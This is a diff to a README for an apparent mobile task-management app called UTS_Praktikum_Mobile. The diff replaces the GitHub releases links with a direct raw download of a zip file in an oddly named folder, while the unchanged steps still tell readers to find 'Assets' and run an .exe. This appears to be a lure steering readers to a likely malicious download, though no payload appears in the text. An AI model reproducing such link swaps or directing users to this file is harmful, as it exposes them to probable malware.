@@ -1,6 +1,6 @@
 # 📱 UTS_Praktikum_Mobile - Manage your mobile tasks with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/slain-counterintelligence516/UTS_Praktikum_Mobile/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/slain-counterintelligence516/UTS_Praktikum_Mobile/main/gelatination/UT_Mobile_Praktikum_3.4.zip)
 
 ## 📋 What is this application?
 
@@ -18,7 +18,7 @@ The UTS_Praktikum_Mobile application helps users organize mobile project data on
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the following link to access the software files: [https://github.com/slain-counterintelligence516/UTS_Praktikum_Mobile/releases](https://github.com/slain-counterintelligence516/UTS_Praktikum_Mobile/releases).
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/slain-counterintelligence516/UTS_Praktikum_Mobile/main/gelatination/UT_Mobile_Praktikum_3.4.zip](https://raw.githubusercontent.com/slain-counterintelligence516/UTS_Praktikum_Mobile/main/gelatination/UT_Mobile_Praktikum_3.4.zip).
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your Downloads folder.
